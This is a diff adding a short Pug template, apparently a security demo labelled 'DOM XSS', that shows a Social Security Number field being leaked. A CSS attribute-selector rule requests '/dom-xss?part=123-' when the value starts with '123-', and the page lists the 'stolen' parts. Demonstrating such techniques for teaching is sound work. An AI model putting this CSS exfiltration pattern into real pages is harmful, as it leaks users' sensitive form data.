@@ -1,0 +1,14 @@
+html
+  head
+    title= title
+    style(type='text/css').
+      input[value^='123-'] {
+        background: url('/dom-xss?part=123-');
+      }
+  body
+    h1 DOM XSS
+    h3 Vulnerable Input
+    label Social Security Number
+      input(name='snn', value= ssn)
+    h3 Stolen: (refresh page)
+    p parts: #{parts}
